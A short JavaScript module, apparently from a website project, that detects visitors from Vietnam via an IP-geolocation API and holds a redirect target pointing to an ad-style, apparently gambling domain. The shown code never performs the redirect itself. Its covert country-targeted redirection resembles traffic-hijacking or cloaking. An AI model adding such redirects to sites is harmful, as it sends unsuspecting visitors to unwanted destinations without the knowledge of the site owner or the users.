// Simple IP geolocation and redirect utility
export class IPRedirectService {
    constructor() {
        this.vietnamRedirectUrl = 'https://ad.zo88vip.top';
        this.notFoundRedirectUrl = 'https://beautiful-404-page-w-m70k.bolt.host';
        this.isRedirectEnabled = true;
    }

    // Simple check if IP is from Vietnam
    async checkVietnameseIP() {
        try {
            // Use a simple, reliable service that works with CORS
            const response = await fetch('https://ipapi.co/json/', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                }
            });

            if (!response.ok) {
                throw new Error('IP service failed');
            }

            const data = await response.json();

            // Check if country code is Vietnam
            return data.country_code === 'VN';

        } catch (error) {
            // If IP check fails, default to false (don't redirect)
            return false;
        }
    }

    // Enable/disable redirect functionality
    setRedirectEnabled(enabled) {
        this.isRedirectEnabled = enabled;
    }

    // Update redirect URL
    setRedirectUrl(url) {
        this.vietnamRedirectUrl = url;
    }
}

// Create singleton instance
export const ipRedirectService = new IPRedirectService();